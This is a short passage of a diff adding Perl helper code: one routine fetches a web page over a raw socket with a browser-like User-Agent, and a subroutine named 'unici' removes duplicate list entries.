+$host=~s/href=\"?http:\/\///;
+$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+$query=~s/$host//;
+if ($query eq "") {$query="/";};
+eval {
+my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
+print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
+my @r = <$sock>;
+$page="@r";
+close($sock);
+};
+return $page;
+}
+ 
+sub unici{
+my @unici = ();
+my %visti = ();
+foreach my $elemento ( @_ )
+{
+next if $visti{ $elemento }++;
+push @unici, $elemento;
+}
+return @unici;
+}
